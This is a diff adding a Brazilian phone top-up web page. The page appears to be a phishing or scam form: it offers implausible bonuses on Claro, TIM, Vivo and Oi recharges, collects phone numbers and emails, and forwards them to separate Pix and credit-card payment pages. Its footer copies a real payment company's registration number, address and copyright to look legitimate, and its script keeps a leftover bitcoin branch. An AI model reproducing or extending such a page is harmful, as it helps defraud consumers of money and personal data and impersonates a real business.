@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recarga</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #dda0dd;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .header img {
+            width: 150px;
+            height: auto;
+        }
+        .container {
+            padding: 20px;
+        }
+        .info-message {
+            margin: 20px 0;
+            font-size: 1.2em;
+            font-weight: bold;
+            text-align: left;
+        }
+        form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: left;
+            max-width: 600px;
+            margin: auto;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        select, input[type="text"], input[type="email"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px;
+            background-color: #ff69b4; /* Rosa */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #ff1493; /* Rosa escuro */
+        }
+        .payment-image {
+            display: inline-block;
+            margin-top: 10px;
+            text-align: center;
+            width: 100%;
+        }
+        .footer {
+            background-color: #ff69b4; /* Rosa */
+            color: white;
+            text-align: center;
+            padding: 20px 10px;
+            margin-top: 20px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="Operadoras.png" alt="Operadoras">
+    </div>
+
+    <div class="container">
+        <p class="info-message">Ganhe 50GB de internet e ligação ilimitada na sua primeira recarga de R$20!</p>
+
+        <form id="recarga-form" method="GET" action="">
+            <label for="operadora">Operadora:</label>
+            <select id="operadora" name="operadora" onchange="atualizarImagemOperadora()">
+                <option value="">Selecione a operadora</option>
+                <option value="claro">Claro</option>
+                <option value="tim">TIM</option>
+                <option value="vivo">Vivo</option>
+                <option value="oi">Oi</option>
+            </select>
+            <div id="imagem-operadora" class="payment-image"></div>
+
+            <label for="valor">Recarga:</label>
+            <select id="valor" name="valor">
+                <option value="R$10,00 + 5GB + bônus">R$10,00 + 5GB + bônus</option>
+                <option value="R$20,00 + 10GB + WhatsApp + Instagram">R$20,00 + 10GB + WhatsApp + Instagram</option>
+                <option value="R$30,00 + 15GB + redes sociais grátis">R$30,00 + 15GB + redes sociais grátis</option>
+                <option value="R$50,00 + 50GB + Globo Play + ligações ilimitadas">R$50,00 + 50GB + Globo Play + ligações ilimitadas</option>
+                <option value="R$100,00 + 90GB + 60 dias de WhatsApp + Instagram + Facebook">R$100,00 + 90GB + 60 dias de WhatsApp + Instagram + Facebook</option>
+            </select>
+
+            <label for="telefone">Número de Telefone:</label>
+            <input type="tel" id="telefone" name="telefone" placeholder="(11) 12345-6789" required>
+
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" name="email" placeholder="exemplo@dominio.com" required>
+
+            <label for="pagamento">Forma de Pagamento:</label>
+            <select id="pagamento" name="pagamento" required>
+                <option value="pix">Pix</option>
+                
+                <option value="cartao">Cartão de Crédito</option>
+            </select>
+
+            <button type="submit">Confirmar Recarga</button>
+        </form>
+    </div>
+
+       <div class="footer">
+        <p><div class="media-body"> 
+      <p>CNPJ: 11.275.560/0001-75. Endereço: Avenida Brigadeiro Faria Lima, nº 4055, 1º andar, sala 1-114, Espaço WeWork - Sala RecargaPay, Itaim Bibi, São&nbsp;Paulo/SP, CEP 04538-133</address> 
+      <p>Copyright ©2024 RecargaPay Instituição de Pagamento Ltda. Todos&nbsp;os&nbsp;direitos&nbsp;reservados.</p> 
+     </div></p>
+    </div>
+
+
+    <script>
+        document.getElementById('recarga-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const operadora = document.getElementById('operadora').value;
+            const valor = document.getElementById('valor').value;
+            const telefone = document.getElementById('telefone').value;
+            const email = document.getElementById('email').value;
+            const pagamento = document.getElementById('pagamento').value;
+
+            let url = '';
+
+            if (pagamento === 'pix') {
+                url = '2.html';
+            } else if (pagamento === 'bitcoin') {
+                url = '1.html';
+            } else if (pagamento === 'cartao') {
+                url = '3.html';
+            }
+
+            window.location.href = `${url}?operadora=${operadora}&valor=${valor}&telefone=${telefone}&email=${email}`;
+        });
+
+        function atualizarImagemOperadora() {
+            const operadora = document.getElementById('operadora').value;
+            const imagemOperadora = document.getElementById('imagem-operadora');
+            imagemOperadora.innerHTML = '';
+
+            if (operadora) {
+                const img = document.createElement('img');
+                img.src = `${operadora}.png`;
+                img.alt = operadora;
+                img.style.width = '50px';
+                img.style.height = 'auto';
+                imagemOperadora.appendChild(img);
+            }
+        }
+
+        document.getElementById('telefone').addEventListener('input', function(event) {
+            const input = event.target;
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            const formattedValue = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            input.value = formattedValue;
+        });
+    </script>
+</body>
+</html>
